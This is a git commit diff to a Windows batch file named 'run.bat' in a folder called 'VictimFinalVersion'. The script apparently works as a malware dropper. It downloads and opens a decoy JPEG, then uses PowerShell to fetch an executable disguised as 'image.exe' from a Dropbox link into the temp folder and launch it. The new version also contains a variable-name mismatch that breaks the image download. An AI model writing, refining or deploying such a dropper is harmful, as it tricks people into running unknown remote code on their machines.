c0f8dbd8a26745df61f4e7c4929b394698a071f5
devkaare <kaarehofferdal@gmail.com>
2025-02-02 05:27:33 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -1,12 +1,15 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set files="https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg" "https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"
+set imgURL="https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg"
+set execURL="https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"
 
-for %%i in (%files%) do (
-    set "fileName=%TEMP%\%%~nxi"
-    powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%%i', '!fileName!');"
-    start !fileName!
-)
+set imageFile="%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
+set execFile="%TEMP%\image.exe"
+
+powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageURL%', '%imageFile%');"
+start !imageFile!
+
+powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');Invoke-Item '%execFile%';"
 
 endlocal
